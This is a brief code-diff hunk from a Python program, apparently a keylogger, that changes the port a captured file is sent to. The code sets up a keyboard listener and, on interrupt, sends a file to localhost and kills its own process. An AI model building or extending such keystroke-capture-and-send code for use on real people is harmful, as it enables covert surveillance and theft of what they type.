@@ -31,7 +31,7 @@ def listen_keyboard():
             Thread(target=func_handle_time,args=(10.0,listener)).start()
             listener.join()
     except KeyboardInterrupt:
-        client.send_file_securely("127.0.0.1", 1234)
+        client.send_file_securely("127.0.0.1", 12345)
         os.kill(os.getpid(), signal.SIGKILL)
 
         
